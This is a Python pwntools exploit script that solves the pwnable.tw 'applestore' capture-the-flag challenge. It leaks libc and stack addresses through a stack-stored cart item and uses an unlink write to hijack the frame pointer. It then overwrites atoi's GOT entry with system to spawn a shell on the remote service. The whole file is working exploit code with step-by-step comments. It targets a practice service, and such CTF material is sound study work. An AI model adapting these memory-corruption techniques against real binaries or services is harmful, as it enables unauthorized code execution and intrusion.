#!/usr/bin/python2
from pwn import *

# r = process('./applestore', env={"LD_PRELOAD":"libc_32.so.6"})
# context.terminal = ["tmux", "splitw", "-h"]
# gdb.attach(proc.pidof(r)[0], gdbscript="""
#                                 continue
#                                         """)
r = remote('chall.pwnable.tw', 10104)
elf = ELF('./applestore')
libc = ELF('./libc_32.so.6')

def add(device_num):
    r.recvuntil('>')
    r.sendline('2')
    r.recvuntil('Device Number>')
    r.sendline(device_num)

def remove(payload):
    r.recvuntil('>')
    r.sendline('3')
    r.recvuntil('Item Number>')
    r.sendline(payload)

def checkout():
    r.recvuntil('>')
    r.sendline('5')
    r.recvuntil('(y/n) >')
    r.sendline('y')

def cart(payload):
    r.recvuntil('>')
    r.sendline('4')
    r.recvuntil('(y/n) >')
    r.sendline(payload)
    
def solve():
    # get iphone 8
    # in checkout, if total price = 7174 => create a new struct iphone 8 and add to cart
    # this struct is stored in stack => vulnerability

    # 7174 = 20*299 + 6*199
    for i in range(20):
        add('2')
    for i in range(6):
        add('1')

    checkout()
    # now item 27 is stored in stack (not heap)

    # leak libc base by atoi address
    payload = "y\x00" + p32(elf.got['atoi']) + p32(0)*3     # overwrite item 27 with atoi_got in stack frame
    cart(payload)                           
    r.recvuntil("27: ")                                     # print value of atoi_got (item 27)
    atoi_address = u32(r.recvline()[0:4])
    libc.address = atoi_address - libc.symbols['atoi']
    log.info("libc base: %s"% hex(libc.address))

    # leak stack address
    payload = "y\x00" + p32(libc.symbols['environ']) + p32(0)*3     # print value of environ (item 27)
    cart(payload)
    r.recvuntil("27: ")
    environ_address = u32(r.recvline()[0:4])
    ebp = environ_address - 0x104
    log.info("ebp address: %s"%hex(ebp))

    # in function handler(): char nptr[22]; // [esp+16h] [ebp-22h]
    # write ebp to atoi+0x22 (unlink)
    # item[27]->fd: atoi_got + 0x22
    # item[27]->bk: ebp-0x8
    # unlink
    #   fd = *(_DWORD *)(v2 + 8);       (atoi_got + 0x22)
    #   bk = *(_DWORD *)(v2 + 12);      (ebp-0x8)    
    #   if ( bk )
    #     *(_DWORD *)(bk + 8) = fd;     *ebp = *(atoi_got+0x22) (goal)
    #   if ( fd )
    #     *(_DWORD *)(fd + 12) = bk;    *(atoi_got+0x22) + 12 = ebp-0x8     (doesnt matter)
    payload = "27" + p32(0) + p32(0) + p32(elf.got['atoi']+0x22) + p32(ebp-0x8)
    remove(payload)
    
    # now ebp-0x22 = atoi_got => we can overwrite atoi to system addr in function handler()
    payload = p32(libc.symbols['system']) + ';sh;'
    r.recvuntil('>')
    r.sendline(payload)
    r.interactive()

if __name__ == '__main__':
    solve()

"""
note:
_ unlink is a bitch
_ environ can leak stack address
"""